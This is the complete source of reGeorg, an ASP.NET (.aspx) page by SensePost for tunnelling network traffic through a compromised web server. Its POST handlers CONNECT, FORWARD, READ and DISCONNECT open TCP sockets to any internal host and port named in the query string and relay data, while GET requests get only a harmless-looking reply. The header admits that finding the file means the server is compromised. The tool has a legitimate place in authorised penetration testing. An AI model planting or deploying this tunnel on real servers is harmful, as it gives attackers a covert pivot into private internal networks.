<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%
/*                   _____                                    
  _____   ______  __|___  |__  ______  _____  _____   ______  
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___| 
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  | 
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______| 
                    |_____|
                    ... every office needs a tool like Georg
                    
  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad

Legal Disclaimer
Usage of reGeorg for attacking networks without consent
can be considered as illegal activity. The authors of
reGeorg assume no liability or responsibility for any
misuse or damage caused by this program.

If you find reGeorge on one of your servers you should
consider the server compromised and likely further compromise
to exist within your internal network.

For more information, see:
https://github.com/sensepost/reGeorg
*/
    try
    {
        if (Request.HttpMethod == "POST")
        {
            //String cmd = Request.Headers.Get("X-CMD");
            String cmd = Request.QueryString.Get("cmd").ToUpper();
            if (cmd == "CONNECT")
            {
                try
                {
                    String target = Request.QueryString.Get("target").ToUpper();
                    //Request.Headers.Get("X-TARGET");
                    int port = int.Parse(Request.QueryString.Get("port"));
                    //Request.Headers.Get("X-PORT"));
                    IPAddress ip = IPAddress.Parse(target);
                    System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                    Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    sender.Connect(remoteEP);
                    sender.Blocking = false;
                    Session.Add("socket", sender);
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd == "DISCONNECT")
            {
                try {
                    Socket s = (Socket)Session["socket"];
                    s.Close();
                } catch (Exception ex){

                }
                Session.Abandon();
                Response.AddHeader("X-STATUS", "OK");
            }
            else if (cmd == "FORWARD")
            {
                Socket s = (Socket)Session["socket"];
                try
                {
                    int buffLen = Request.ContentLength;
                    byte[] buff = new byte[buffLen];
                    int c = 0;
                    while ((c = Request.InputStream.Read(buff, 0, buff.Length)) > 0)
                    {
                        s.Send(buff);
                    }
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd == "READ")
            {
                Socket s = (Socket)Session["socket"];
                try
                {
                    int c = 0;
                    byte[] readBuff = new byte[512];
                    try
                    {
                        while ((c = s.Receive(readBuff)) > 0)
                        {
                            byte[] newBuff = new byte[c];
                            //Array.ConstrainedCopy(readBuff, 0, newBuff, 0, c);
                            System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
                            Response.BinaryWrite(newBuff);
                        }
                        Response.AddHeader("X-STATUS", "OK");
                    }                    
                    catch (SocketException soex)
                    {
                        Response.AddHeader("X-STATUS", "OK");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            } 
        } else {
            Response.Write("Georg says, 'All seems fine'");
        }
    }
    catch (Exception exKak)
    {
        Response.AddHeader("X-ERROR", exKak.Message);
        Response.AddHeader("X-STATUS", "FAIL");
    }
%>
